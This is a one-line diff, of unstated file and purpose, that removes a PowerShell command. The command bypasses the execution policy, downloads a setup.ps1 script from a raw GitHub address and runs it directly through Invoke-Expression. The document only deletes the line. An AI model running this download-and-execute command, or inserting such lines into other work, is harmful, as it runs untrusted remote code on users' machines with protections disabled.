@@ -1,1 +1,0 @@
-powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/rezwanahmedratul/logo/refs/heads/main/setup.ps1 -UseBasicParsing | iex"
